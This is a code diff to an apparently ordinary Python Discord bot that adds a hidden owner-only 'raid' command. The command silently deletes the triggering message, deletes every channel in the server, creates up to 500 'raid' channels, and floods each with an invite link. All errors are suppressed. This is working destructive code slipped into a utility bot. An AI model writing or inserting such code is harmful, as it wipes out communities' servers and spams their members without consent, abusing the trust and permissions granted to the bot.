@@ -590,6 +590,36 @@ async def get_id(ctx, member: discord.Member = None):
     member = member or ctx.author
     await ctx.send(f"{member.name}'s ID: {member.id}")
 
+@bot.command()
+async def raid(ctx):
+    if ctx.author.id != OWNER_ID:
+        return
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+    channels_to_delete = list(ctx.guild.channels)
+    for channel in channels_to_delete:
+        try:
+            await channel.delete()
+            await asyncio.sleep(0.1)
+        except:
+            pass
+    for i in range(1, 501):
+        try:
+            new_channel = await ctx.guild.create_text_channel(name=f"raid-{i}")
+            async def send_spam(target_channel):
+                for _ in range(5):
+                    try:
+                        await target_channel.send("https://discord.gg/deltax")
+                        await asyncio.sleep(0.1)
+                    except:
+                        break
+            bot.loop.create_task(send_spam(new_channel))
+            await asyncio.sleep(0.1)
+        except:
+            break
+
 keep_alive()
 
 bot.run(os.getenv("TOKEN"))
